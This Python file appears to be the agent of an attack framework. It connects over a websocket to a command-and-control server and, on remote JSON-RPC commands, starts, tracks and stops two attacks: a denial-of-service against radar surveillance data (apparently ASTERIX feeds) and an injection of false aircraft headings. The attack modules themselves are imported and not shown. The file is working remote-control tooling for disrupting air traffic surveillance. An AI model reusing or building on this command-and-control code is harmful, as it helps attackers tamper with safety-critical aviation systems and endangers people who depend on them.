import aiohttp
import asyncio
import json
import logging
import uuid
import decimal

from dataclasses import dataclass
from typing import Any, List, Optional

from attacks import Attack
from attacks.asterix import dos_radar, DOSRadarAttack
from attacks.heading import inject_heading, InjectHeadingAttack

from settings import CC_WS_URL

@dataclass
class AttackInstance:
  task: asyncio.Task
  name: str
  params: List[Any]

  @classmethod
  def start(cls, attack: Attack, args):
    logger = logging.getLogger(cls.__name__)
    logger.debug(f'Starting {attack} {args}')
    task = asyncio.create_task(attack.run(**args))
    name = attack.name
    params = args
    return cls(task, name, params)

  async def stop(self):
    self.task.cancel()
    try:
      await self.task
    except asyncio.CancelledError:
      pass
  
  def to_json(self):
    return {
      'name': self.name,
      'params': self.params,
      'running': True,
    }

def filter_json(x):
  if isinstance(x, dict):
    return {k:filter_json(v) for k,v in x.items()}
  if isinstance(x, decimal.Decimal):
    return float(x)
  return x

def build_rpc_error_response(id, error):
  return { 'jsonrpc': '2.0', 'error': filter_json(error), 'id': id }

def build_rpc_success_response(id, result):
  return { 'jsonrpc': '2.0', 'result': filter_json(result), 'id': id }

async def command_and_control():
  logger = logging.getLogger(command_and_control.__name__)

  available_attacks = [
    InjectHeadingAttack(),
    DOSRadarAttack(),
  ]

  def find_attack_by_name(name: str) -> Optional[Attack]:
    attacks = filter(lambda x : x.name == name, available_attacks)
    return next(attacks, None)

  running_attacks: List[AttackInstance] = []

  def find_running_attack_by_name(name: str) -> Optional[AttackInstance]:
    attacks = filter(lambda x : x.name == name, running_attacks)
    return next(attacks, None)

  async with aiohttp.ClientSession(loop=asyncio.get_running_loop()) as session:
    async with session.ws_connect(CC_WS_URL + '/command', autoping = True, heartbeat = 10.0) as ws:
      logger.info('Connected')
      async for msg in ws:
        if msg.type == aiohttp.WSMsgType.TEXT:
          logger.debug(f'Received {msg.data} from C&C')
          command = json.loads(msg.data)

          rpc_method = command['method']
          rpc_params = command.get('params', [])
          rpc_id = command.get('id', None)

          match rpc_method:

            case 'attack_inventory':
              rpc_response = build_rpc_success_response(rpc_id, [ attack.to_json() for attack in available_attacks ])
              await ws.send_json(rpc_response)

            case 'attack_start':
              attack_name = rpc_params[0]
              attack_args = rpc_params[1:]

              attack = find_attack_by_name(attack_name)
              if attack is None:
                rpc_response = build_rpc_error_response(rpc_id, f'Unknown attack {attack_name}')
                await ws.send_json(rpc_response)
                continue

              running_attack = find_running_attack_by_name(attack_name)
              if running_attack is not None:
                rpc_response = build_rpc_error_response(rpc_id, f'Attack already running {attack_name}')
                await ws.send_json(rpc_response)
                continue

              attack_params = attack.build_parameters_dict(*attack_args)
              logger.debug(f'Starting attack name {attack_name} params {attack_params}')

              attack_instance = AttackInstance.start(attack, attack_params)
              running_attacks.append(attack_instance)

              rpc_response = build_rpc_success_response(rpc_id, { 'name': attack_name, 'params': attack_args, 'running': True, })
              await ws.send_json(rpc_response)

            case 'attack_state':
              if len(rpc_params) == 0:
                rpc_response = build_rpc_success_response(rpc_id, [ attack.to_json() for attack in running_attacks ])
                await ws.send_json(rpc_response)
              else:
                attack_instance = find_running_attack_by_name(rpc_params[0])
                if attack_instance is None:
                  rpc_response = build_rpc_success_response(rpc_id, { 'name': rpc_params[0], 'params': [], 'running': False, })
                  await ws.send_json(rpc_response)
                else:
                  rpc_response = build_rpc_success_response(rpc_id, attack_instance.to_json())
                  await ws.send_json(rpc_response)

            case 'attack_stop':
              attack_name = rpc_params[0]
              attack_instance = find_running_attack_by_name(rpc_params[0])
              if attack_instance is None:
                rpc_response = build_rpc_error_response(rpc_id, f'Attack {attack_name} not found')
                await ws.send_json(rpc_response)
              else:
                await attack_instance.stop()
                running_attacks.remove(attack_instance)
                rpc_response = build_rpc_success_response(rpc_id, { 'name': attack_name, 'params': [], 'running': False, })
                await ws.send_json(rpc_response)

            case o:
              rpc_response = build_rpc_error_response(rpc_id, f'Unknown RPC method {o}')
              await ws.send_json(rpc_response)
